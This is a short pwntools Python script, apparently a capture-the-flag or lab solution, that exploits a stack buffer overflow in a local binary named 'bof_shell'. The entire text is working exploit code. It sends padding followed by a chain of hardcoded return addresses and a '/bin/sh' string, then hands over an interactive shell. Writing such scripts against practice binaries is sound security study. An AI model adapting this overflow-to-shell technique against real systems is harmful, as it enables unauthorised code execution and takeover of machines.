from pwn import *

p = process("./bof_shell")
payload = b"A"*64 + b"B"*8 + p64(0x40101a) + p64(0x401253) + p64(0x7fffffffdcf8) + p64(0x7ffff7e1d290) + b"/bin/sh\x00"
payload += p64(0)
p.sendline(payload)
p.interactive()
